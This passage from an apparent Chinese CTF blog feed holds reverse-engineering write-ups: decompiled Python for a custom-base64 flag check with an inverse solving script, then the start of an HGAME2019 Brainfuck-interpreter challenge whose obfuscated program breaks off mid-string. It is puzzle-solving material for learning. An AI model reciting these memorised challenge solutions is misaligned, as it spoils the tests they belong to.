class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import string</span><br><span class="line">letters=list(string.letters)+list(string.digits)+[&apos;+&apos;,&apos;/&apos;]</span><br><span class="line">dec=&quot;FcjTCgD1EffEm2rPC3bTyL5Wu2bKBI9KAZrwFgrUygHN&quot;</span><br><span class="line">def encode(str):</span><br><span class="line">&apos;换表base64&apos;</span><br><span class="line">return str</span><br><span class="line">enc=raw_input()</span><br><span class="line">lst=list(enc)</span><br><span class="line">lst.reverse()</span><br><span class="line">for i in range(len(lst)):</span><br><span class="line">if i % 2 == 0:</span><br><span class="line">lst[i]=chr(ord(lst[i])-1)</span><br><span class="line">continue</span><br><span class="line">lst[i]=chr(ord(lst[i])+1)</span><br><span class="line">enc2=&apos;&apos;</span><br><span class="line">enc2=enc2.join(lst)</span><br><span class="line">enc3=encode(enc2)</span><br><span class="line">if enc3==dec:</span><br><span class="line">print &quot;You&apos;re right! &quot;</span><br><span class="line">else:</span><br><span class="line">print &quot;You&apos;re Wrong! &quot;</span><br><span class="line">print letters</span><br></pre></td></tr></table></figure><p>虽然定义的函数的内容dis模块是不会解析出来的，但是看见熟悉的<code>string.letters+string.digits+&#39;+&#39;+&#39;/&#39;</code>，我不经意间想起了base64，只是换了个表而已。dec字符串中的大小写互换，然后base64解密，之后通过逆运算得到flag。</p><p>逆运算脚本(换表base64就不自己手写了）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dec=&apos;|&quot;mpguxQ^3dispmb^pS`dn/dk4V|dn`hg&apos;</span><br><span class="line">lst=list(dec)</span><br><span class="line">for i in range(len(lst)):</span><br><span class="line">if i % 2 == 0:</span><br><span class="line">lst[i]=chr(ord(lst[i])+1)</span><br><span class="line">if i % 2 == 1:</span><br><span class="line">lst[i]=chr(ord(lst[i])-1)</span><br><span class="line">lst.reverse()</span><br><span class="line">print &apos;&apos;.join(lst)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HGAME2019-brainfxxker&#39;s revenge</title>
      <link href="/2019/02/05/brainfxxker-s-revenge/"/>
      <url>/2019/02/05/brainfxxker-s-revenge/</url>
      
        <content type="html"><![CDATA[<p>题目来自于HGAME2019，之前一直放着没做，结果发现第一周的题目现在做已经没分了23333</p><a id="more"></a><p>源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;cctype&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line"></span><br><span class="line">// the description of this challenge is totally useless 2333333</span><br><span class="line"></span><br><span class="line">// oyiadin, Jan 29, 2019</span><br><span class="line">// have fun XD</span><br><span class="line"></span><br><span class="line">namespace bf &#123;</span><br><span class="line">  </span><br><span class="line">class Parser &#123;</span><br><span class="line"> public:</span><br><span class="line">  Parser() = default;</span><br><span class="line">  ~Parser() = default;</span><br><span class="line">  void execute(const std::string &amp;buf);</span><br><span class="line">  </span><br><span class="line"> protected:</span><br><span class="line">  uint8_t data[1000] = &#123;0&#125;;</span><br><span class="line">  uint8_t *ptr = data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void Parser::execute(const std::string &amp;buf) &#123;</span><br><span class="line">  unsigned unmatched;</span><br><span class="line">  for (auto i = buf.cbegin(); i != buf.cend(); ++i) &#123;</span><br><span class="line">    switch (*i) &#123;</span><br><span class="line">      case &apos;&gt;&apos;:</span><br><span class="line">        ++ptr;</span><br><span class="line">        break;</span><br><span class="line">      case &apos;&lt;&apos;:</span><br><span class="line">        --ptr;</span><br><span class="line">        break;</span><br><span class="line">      case &apos;+&apos;:</span><br><span class="line">        ++*ptr;</span><br><span class="line">        break;</span><br><span class="line">      case &apos;-&apos;:</span><br><span class="line">        --*ptr;</span><br><span class="line">        break;</span><br><span class="line">      case &apos;.&apos;:</span><br><span class="line">        putchar(*ptr);</span><br><span class="line">        break;</span><br><span class="line">      case &apos;,&apos;:</span><br><span class="line">        while ((*ptr = getchar()) == &apos;\n&apos;) ;</span><br><span class="line">        break;</span><br><span class="line">      case &apos;[&apos;:</span><br><span class="line">        if (*ptr == 0) &#123;</span><br><span class="line">          unmatched = 1;</span><br><span class="line">          while (unmatched) &#123;</span><br><span class="line">            while (++i != buf.cend()) &#123;</span><br><span class="line">              if (*i == &apos;[&apos;) &#123;</span><br><span class="line">                ++unmatched;</span><br><span class="line">                break;</span><br><span class="line">              &#125; else if (*i == &apos;]&apos;) &#123;</span><br><span class="line">                --unmatched;</span><br><span class="line">                break;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        break;</span><br><span class="line">      case &apos;]&apos;:</span><br><span class="line">        if (*ptr != 0) &#123;</span><br><span class="line">          unmatched = 1;</span><br><span class="line">          while (unmatched) &#123;</span><br><span class="line">            while (i-- != buf.cbegin()) &#123;</span><br><span class="line">              if (*i == &apos;[&apos;) &#123;</span><br><span class="line">                --unmatched;</span><br><span class="line">                break;</span><br><span class="line">              &#125; else if (*i == &apos;]&apos;) &#123;</span><br><span class="line">                ++unmatched;</span><br><span class="line">                break;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        break;</span><br><span class="line">      default:</span><br><span class="line">        putchar(*i);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">  bf::Parser parser;</span><br><span class="line">  parser.execute(</span><br><span class="line">    &quot;+-&gt;,&lt;&gt;-+&lt;&gt;&gt;+-+-+&gt;&lt;+-+&lt;&gt;+-&gt;&lt;+-+&lt;&gt;+-+&lt;&gt;&lt;&gt;+&gt;&lt;[&lt;&gt;&lt;--+&gt;&lt;&lt;&gt;-&lt;&gt;&gt;&lt;&lt;&gt;&gt;&lt;-&lt;&gt;&lt;&gt;+-&gt;&lt;-&lt;&gt;&gt;&lt;-+-+--+-&lt;&gt;&gt;&lt;-+&lt;&gt;&lt;&gt;-----&gt;&quot;</span><br><span class="line">    &quot;&lt;&lt;&gt;&gt;&lt;+-&lt;&gt;--+--+&gt;&lt;+--+-&gt;&lt;-+-+-+-&gt;&lt;&lt;&gt;--+-+-+-&lt;&gt;-+--+-+-&lt;&gt;&lt;&gt;+-&lt;&gt;-+-&gt;&gt;&lt;-+-]&gt;&lt;&gt;&lt;-+&lt;&gt;+-&lt;-+---+&gt;&lt;-&lt;&gt;-+-&lt;&gt;[+&quot;</span><br><span class="line">    &quot;-&lt;-+&gt;&lt;&gt;&lt;++--+-++-&gt;-+&lt;&gt;[+-+-&lt;&gt;--++-&gt;&lt;+-][.&gt;&gt;[&lt;-,[[+[-&lt;.[--+]-,+]&gt;&lt;.[&lt;,[[&lt;,--[,&gt;[,&lt;+,.,]&lt;&gt;]+]&lt;.-].[&gt;[-&quot;</span><br><span class="line">    &quot;.,.,[&gt;&lt;&lt;[&lt;-[&gt;.&lt;,.+&lt;]-..].,.[&lt;&gt;+[+][.+-,.&gt;,-+]]-]-.]+&gt;,]]&gt;]&gt;,.&gt;][&lt;,[&lt;[&lt;-&gt;[-.-.-]-]&lt;&lt;[.+[[&gt;,-[&lt;.&lt;[&gt;-&lt;.&quot;</span><br><span class="line">    &quot;+-&lt;]+&lt;]&lt;,[&lt;..+],&gt;+]+,]&lt;--]-.]+..[.&lt;-[,&lt;[&lt;&gt;.[,&lt;[,&gt;&lt;,.]&lt;&lt;+].[--[-..&gt;[-&lt;..]&lt;-]+.]+--]-&lt;&lt;&gt;,&lt;]&gt;&lt;&gt;&lt;-]-.&gt;]&lt;&quot;</span><br><span class="line">    &quot;&gt;,]-&lt;]&gt;&lt;&gt;&lt;&gt;&lt;+-&gt;&lt;][.-.[,[,+&gt;,&gt;][++[+[.[&gt;[&lt;&lt;&gt;,].&lt;&gt;]-[&gt;,],,]+,[.--[+,-,-]+,+]-&lt;&lt;].-+]]]+-&lt;&gt;&lt;&gt;&gt;&lt;-+,&lt;&gt;+-&gt;&quot;</span><br><span class="line">    &quot;&lt;&gt;&lt;-+&gt;+-+--++-+&gt;&lt;-+&lt;&gt;+-++--++-&gt;&lt;-++&gt;&lt;&lt;&gt;&gt;&lt;&lt;&gt;+&gt;&lt;++-&lt;&gt;&gt;&lt;-+[&lt;&gt;&lt;-++--&gt;&lt;-+-+-&lt;&gt;&gt;&lt;+-&gt;&lt;-&gt;&lt;+---++---+-+-+&lt;&gt;-+&quot;</span><br><span class="line">    &quot;-&lt;&gt;+--+&lt;&gt;+--+--&lt;&gt;-+&gt;&lt;--+-++--&gt;&lt;-+--+-&lt;&gt;-&gt;&lt;-&gt;&lt;&lt;&gt;-&gt;&lt;&lt;&gt;+-&gt;&lt;-&gt;&lt;&gt;&lt;-&gt;&lt;&lt;&gt;+-+--+-+--+&lt;&gt;-&gt;&lt;-+&gt;&lt;-+&gt;&lt;--+-++-&lt;&gt;&gt;&quot;</span><br><span class="line">    &quot;-&lt;&gt;+--+]&lt;&gt;&gt;&lt;&lt;&gt;&lt;&lt;&gt;-++-&gt;&lt;-&lt;&gt;&lt;&gt;+-+-&lt;&gt;-&gt;&lt;&gt;&lt;-+--+&gt;&lt;&gt;&lt;+-&lt;&gt;[&gt;&lt;+--+&lt;+-+-+-+&gt;&lt;&gt;[&gt;&lt;-+--++-&lt;&gt;][.-+[&gt;&gt;+[&lt;&lt;,&lt;.&gt;[+&quot;</span><br><span class="line">    &quot;&lt;&lt;&gt;.]+]-+&lt;[.&lt;.+[,[.&gt;&lt;,.+]+-..+]&gt;,-]-]&gt;--]&lt;&gt;]-++--++-,&gt;&lt;+-&gt;&lt;&gt;&gt;&lt;&gt;&lt;+&gt;&lt;-+-+-++&gt;&lt;&lt;&gt;&lt;&gt;+-+&lt;&gt;&lt;&gt;+-+&lt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;+&gt;&quot;</span><br><span class="line">    &quot;&lt;&gt;&lt;-+[&gt;&lt;-+&lt;&gt;-+&lt;+---&gt;&lt;-+-+&lt;&gt;-+--+-+-+--+-+-&lt;&gt;-++-&gt;&lt;---+&lt;&gt;&lt;&gt;&gt;&lt;&gt;&lt;-&lt;&gt;+---+-+----+-&lt;&gt;&lt;&gt;-+-+--+-+-&lt;&gt;-&gt;&lt;-+&gt;&quot;</span><br><span class="line">    &quot;&lt;&gt;&lt;-&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;--+&gt;&lt;--+-+&gt;+--&gt;&lt;&gt;&lt;&gt;&lt;+--+]+-+-&lt;&gt;&lt;-+&lt;&gt;+--+-&lt;&gt;-[&lt;&gt;&lt;&gt;&lt;-++-+&gt;&lt;&lt;&gt;&gt;&gt;&lt;-+&lt;&gt;&gt;&lt;&gt;&lt;[&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;-+-&gt;&lt;&gt;&lt;+-&quot;</span><br><span class="line">    &quot;&lt;&gt;+-][,&gt;&gt;]+-&gt;&lt;-+-+&gt;&lt;],+-&gt;&lt;-++-&gt;-+&gt;&lt;+-++-+&gt;&lt;&lt;&gt;+++&gt;&lt;&gt;&lt;&gt;&lt;++-+[-+-+&gt;&lt;&lt;&gt;&lt;&lt;&gt;-&gt;&lt;&lt;&gt;-+-+-&gt;&lt;&lt;&gt;-++-&gt;&lt;-&lt;&gt;-+-+-+-&quot;</span><br><span class="line">    &quot;+-&gt;&lt;-+--+-+-+-&lt;&gt;-+-&lt;&gt;+--+-&lt;&gt;&lt;&gt;+-+--+-+-+-&lt;&gt;--+&lt;&gt;--++-&lt;&gt;-+---+&lt;&gt;-&gt;&lt;&lt;&gt;-+-&gt;&gt;&lt;-&lt;&gt;][-[.&gt;[,,&lt;[.,.[,[&gt;[.,-+&quot;</span><br><span class="line">    &quot;+].-][&lt;.[&gt;[,&lt;[&lt;&gt;+]&gt;[-+-[.&lt;&lt;+.-]-[&gt;]&gt;&lt;,]+][[+&gt;-+[&lt;,&lt;]]]++]++++]][-++[&lt;[&gt;+.,-]-,+]&lt;]].+]-,++].-,]+-&gt;&lt;-&quot;</span><br><span class="line">    &quot;+&lt;&gt;+-&lt;-+-+&gt;&lt;-+-&lt;&gt;+---+-+&lt;&gt;-+-&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;&lt;&gt;-[&gt;&lt;&gt;&lt;+-&lt;&gt;&lt;+-+-+&gt;&lt;&gt;[-&lt;&gt;-+]-+],&gt;&lt;&lt;&gt;+-&gt;&lt;&gt;&lt;&gt;&lt;&gt;+&lt;&gt;-++-&lt;&gt;+-+&lt;&gt;++&lt;&gt;&quot;</span><br><span class="line">    &quot;++-&lt;&gt;&gt;&lt;+&gt;&lt;&lt;&gt;+-+-&gt;&lt;++-&lt;&gt;+-+++-+-&lt;&gt;&gt;&lt;+-[&gt;&lt;&lt;&gt;+-&lt;&gt;&lt;--+-+-&gt;&lt;&lt;&gt;-+-+-&lt;&gt;+--&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;-&lt;&gt;&lt;&gt;-+-+--&lt;&gt;-+-&lt;&gt;-+--+-&lt;&quot;</span><br><span class="line">    &quot;&gt;-&gt;&lt;&lt;&gt;&gt;+-&lt;&gt;+-+--+-&lt;&gt;&gt;&lt;][&gt;&lt;+-[&gt;[&gt;[+.[.[-&gt;&lt;[&gt;&lt;[,,++.[&lt;-[.+,&lt;]&lt;.&lt;]&gt;]]&gt;-,,].,]+&lt;]-,,&lt;][+.&gt;].],+]&lt;&gt;&lt;+-&gt;&lt;&lt;&quot;</span><br><span class="line">    &quot;&gt;-&lt;&gt;&lt;&gt;--+&gt;&lt;[+-&lt;&lt;&gt;&gt;&lt;&lt;&gt;+-++-&gt;&lt;&gt;-+&lt;&gt;[+--+-]&lt;&gt;&lt;&gt;+-&lt;&gt;&gt;&lt;]-++-,&gt;-+-++-++-+-&gt;&lt;+&gt;&lt;+-+&gt;&lt;-+&gt;&lt;++--+&gt;&lt;&lt;&gt;+&lt;&gt;&gt;&lt;-++-&quot;</span><br><span class="line">    &quot;&gt;&lt;+&gt;&lt;+&lt;&gt;-+&gt;&lt;-++-++--++-&gt;&lt;[-+&lt;-+-&gt;&lt;--+&gt;&lt;--+-+-++--&gt;&lt;-&gt;&lt;&lt;&gt;-&lt;&gt;&gt;&lt;&gt;&lt;-+--++--+-&lt;&gt;&gt;&lt;-&gt;&lt;&gt;&lt;-++--&lt;&gt;&gt;&lt;-+-++---&lt;&quot;</span><br><span class="line">    &quot;&gt;+--+---+&gt;&lt;-+&lt;&gt;-&lt;&gt;&gt;-++--+-+-+-&gt;&lt;][..,,]&gt;&lt;&lt;&gt;-+-+&lt;&gt;&lt;+-+-&lt;&gt;+--&gt;&lt;&lt;&gt;--+-++-+--+--+&lt;&gt;&lt;&gt;+-[-+-+&gt;&lt;&gt;&lt;&lt;-+-+-++&quot;</span><br><span class="line">    &quot;-++--++-&lt;&gt;&gt;[-]+-&gt;&lt;&gt;&lt;-+&lt;&gt;][&gt;]&gt;&lt;&gt;&lt;&gt;&lt;+--+,+-&gt;&lt;&lt;&gt;&gt;+-+-+-&gt;&lt;+&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;+-+-+&lt;&gt;&lt;&gt;-++&gt;&lt;+-++--++--+++&gt;&lt;&lt;&gt;++-+-&lt;&quot;</span><br><span class="line">    &quot;&gt;-+++--+&lt;&gt;-++-[-+&lt;-+-&gt;&lt;&gt;&lt;-+-+--&gt;&lt;+-+--&gt;&lt;&lt;&gt;&gt;&lt;-+-&gt;&lt;--+&lt;&gt;-+&lt;&gt;-&lt;&gt;&lt;&gt;&gt;&lt;&gt;&lt;-+-&gt;&lt;-+--+-+-&gt;&lt;+---+&lt;&gt;-&gt;&lt;-+&gt;&lt;&gt;-++&quot;</span><br><span class="line">    &quot;-+--+&lt;&gt;--++-+-+--+][-+&gt;&gt;-]&lt;--&lt;&gt;--&lt;&gt;&lt;&gt;--+&gt;&lt;[&gt;&lt;&gt;&lt;-+-+&lt;++-&lt;&gt;&lt;&gt;&gt;&lt;&gt;[-+-+&lt;&gt;+--+-&lt;&gt;+-&lt;&gt;-+][[[--.[-.-&gt;[&lt;,.,[&quot;</span><br><span class="line">    &quot;++&gt;&lt;&lt;&gt;&gt;&lt;&gt;]]&lt;]-.[.,[.&lt;&gt;]&gt;[&lt;&lt;&gt;[[&gt;&gt;-]+-[&gt;-.[,+&lt;&lt;[[--,&lt;&gt;+,],&gt;[-&gt;-].,+]++&lt;]&lt;[-.[[+,&gt;&lt;+&lt;]&gt;[-&lt;.&gt;&lt;+]&gt;&gt;],[-,[&quot;</span><br><span class="line">    &quot;&lt;]+&lt;]&lt;.]]--+].]]],++]-&gt;[.-[,[-.&lt;&lt;.,].-[,-[,++]+,]]&gt;-&lt;]--&gt;]+-&gt;&lt;&gt;&lt;],+-&gt;&lt;&gt;-++++-+-++--+-++-++-+&lt;&gt;&lt;&gt;+&lt;&gt;&gt;&quot;</span><br><span class="line">    &quot;&lt;+--++-++&gt;&lt;+--+++-&gt;&lt;+--+&gt;&lt;[-+&lt;&gt;&gt;&lt;-+&lt;+--+&lt;&gt;&lt;&gt;&gt;&lt;-+-+-+--+&lt;&gt;--+--+-+--++-&gt;&lt;&gt;&lt;-&lt;&gt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;+--]+-&gt;&lt;+-&lt;--+&gt;&lt;&quot;</span><br><span class="line">    &quot;&lt;&gt;&gt;&lt;&lt;&gt;-+--+-+-+-+---++---+-&gt;&lt;+-[+-&gt;&lt;&lt;&gt;&lt;+-&gt;&lt;+-+&lt;&gt;-+&lt;&gt;+-+-&gt;[&gt;&lt;-+-&gt;&lt;&gt;&lt;][[&lt;&lt;[,-.[&lt;+,-+&lt;]&gt;+],&lt;-,]+.++,.]&lt;&quot;</span><br><span class="line">    &quot;&gt;&gt;&lt;&gt;&lt;&gt;&lt;]-+&gt;&lt;,&gt;&lt;&gt;&gt;&lt;&gt;&lt;+-+-+-+&gt;&lt;+-&lt;&gt;&gt;&lt;++--+&lt;&gt;+-+-+&lt;&gt;+-+-+&lt;&gt;+-+&gt;&lt;+&gt;&lt;&gt;&lt;&gt;&lt;&lt;&gt;[&lt;&gt;-+&lt;&gt;&lt;+-&lt;&gt;+---+&gt;&lt;--+--+-&gt;&lt;&gt;&lt;&quot;</span><br><span class="line">    &quot;--+-&lt;&gt;-++--+-&lt;&gt;+-+--&lt;&gt;&gt;&gt;&lt;&lt;&gt;+--+&lt;&gt;-]&gt;&lt;&lt;&lt;&gt;&lt;&gt;&lt;&gt;+---&gt;&lt;+-&gt;&lt;&gt;&lt;-+-&gt;&lt;-+-&gt;&lt;-++-&lt;&gt;+--[+-&gt;&lt;+-&lt;&lt;&gt;+&gt;&lt;&gt;&lt;&gt;[-&lt;&gt;&gt;&lt;]]&gt;&quot;</span><br><span class="line">    &quot;&lt;&gt;&lt;&lt;&gt;&lt;&gt;-+,&gt;&lt;-+&gt;+-&gt;&lt;+-+&lt;&gt;-+++-+-&lt;&gt;+-++-+&gt;&lt;&gt;&lt;+&gt;&lt;+[&lt;-&gt;&lt;&gt;&lt;-+---+&gt;&lt;&gt;&lt;-&lt;&gt;+-&gt;&lt;+-&lt;&gt;-+-&gt;&lt;-+-+--+&lt;&gt;&lt;&gt;-+--&lt;&gt;-++&quot;</span><br><span class="line">    &quot;-+-&gt;&lt;-&lt;&gt;&lt;&gt;&gt;&lt;-+-&gt;&lt;&lt;&gt;--++-&gt;&lt;&lt;&gt;-&gt;&lt;+-+--&gt;&lt;--+&gt;&lt;+---+&gt;&lt;-+&gt;&lt;-&gt;&gt;&lt;+-+--+-+-]-+&gt;&lt;&lt;-+-++-&lt;&gt;&gt;&lt;-[&gt;&lt;+-&lt;+--++-&gt;&lt;++&quot;</span><br><span class="line">    &quot;-+-&gt;&gt;&lt;&lt;&gt;&gt;&lt;&lt;&gt;[&gt;&lt;+--+&lt;&gt;-+--+&gt;&lt;&lt;&gt;][,&lt;+,]]+-&lt;&gt;,+-&gt;&lt;+-+-&gt;-+-+&lt;&gt;&lt;&gt;&lt;&gt;++&lt;&gt;++-&lt;&gt;&gt;&lt;+--+++&lt;&gt;&gt;&lt;-++-+-++--++&lt;&gt;&gt;&lt;-&quot;</span><br><span class="line">    &quot;+-+-+++-&gt;&lt;-++&gt;&lt;+-&gt;&lt;+-[&lt;--+&lt;&gt;-+-&gt;&lt;+--&lt;&gt;--+-+-+--+&lt;&gt;-&gt;&lt;+-&gt;&lt;-+-&gt;&lt;--+--++-&gt;&lt;&gt;&lt;-&lt;&gt;&lt;&gt;-+&gt;&lt;-&gt;+-&gt;&lt;&lt;&gt;&gt;&lt;-+--+&gt;&lt;&quot;</span><br><span class="line">    &quot;][--+&gt;]&lt;&gt;+-&lt;&gt;&lt;&lt;&gt;&lt;&gt;-+-+-+-&lt;&gt;-&lt;&gt;-+-+[-+&gt;&lt;&gt;&lt;&gt;&lt;&lt;&lt;&gt;-+-+-+++-&lt;&gt;&lt;&gt;+-+-&gt;+-&gt;&lt;[&lt;&gt;+-+--+-&gt;&lt;+-&lt;&gt;]-+-+&gt;&lt;&gt;&lt;]+-,&gt;+-&quot;</span><br><span class="line">    &quot;&gt;&lt;+&lt;&gt;+&gt;&lt;+-+&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;+-+&lt;&gt;&lt;&gt;+&lt;&gt;&lt;&gt;+&gt;&lt;+-&gt;&lt;-+[&lt;&gt;&lt;-++--++---+&lt;&gt;-&lt;&gt;-&gt;&lt;-++-&lt;&gt;--++-+-&gt;&lt;+---&lt;&gt;-+-+-&lt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;+&quot;</span><br><span class="line">    